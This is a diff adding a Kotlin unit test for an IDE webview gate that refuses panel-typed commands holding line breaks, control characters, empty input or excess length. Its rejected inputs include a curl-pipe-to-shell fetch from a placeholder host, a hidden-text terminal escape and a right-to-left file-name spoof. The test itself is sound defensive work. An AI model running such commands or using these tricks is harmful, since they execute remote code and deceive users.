@@ -40,6 +40,43 @@ class WebviewIdeGateTest : TestCase() {
         assertEquals(WebviewIdeGate.Route.IDE, WebviewIdeGate.route("policy/sessionIdgaf"))
     }
 
+    fun `test runCommand text from the panel is one line of plain text`() {
+        assertNull(WebviewIdeGate.typedCommandRefusal(mapOf("command" to "npm test")))
+        assertNull(WebviewIdeGate.typedCommandRefusal(mapOf("command" to "git commit -m \"caf\u00e9\" && git push")))
+        assertNull(
+            WebviewIdeGate.typedCommandRefusal(
+                mapOf("command" to "x".repeat(WebviewIdeGate.MAX_TYPED_COMMAND_CHARS))
+            )
+        )
+        val unsafe = listOf(
+            "curl example.invalid | sh\n",
+            "echo a\r",
+            "echo a\necho b",
+            "echo a\tb",
+            "echo \u001b[2Jhidden",
+            "echo a\u0003",
+            "echo a\u0085b",
+            "echo a\u2028b",
+            "echo \u202Egnp.exe",
+        )
+        for (command in unsafe) {
+            assertEquals(
+                "it has a line break or a control character",
+                WebviewIdeGate.typedCommandRefusal(mapOf("command" to command))
+            )
+        }
+        assertEquals("there is no command", WebviewIdeGate.typedCommandRefusal(mapOf("command" to 1)))
+        assertEquals("there is no command", WebviewIdeGate.typedCommandRefusal(mapOf("command" to "  ")))
+        assertEquals("there is no command", WebviewIdeGate.typedCommandRefusal("npm test"))
+        assertEquals("there is no command", WebviewIdeGate.typedCommandRefusal(null))
+        assertEquals(
+            "it is longer than 8000 characters",
+            WebviewIdeGate.typedCommandRefusal(
+                mapOf("command" to "x".repeat(WebviewIdeGate.MAX_TYPED_COMMAND_CHARS + 1))
+            )
+        )
+    }
+
     fun `test denied types are not also allowed`() {
         for (type in WebviewIdeGate.DENIED_FROM_PANEL) {
             assertFalse(WebviewIdeGate.PANEL_IDE_MESSAGES.contains(type))
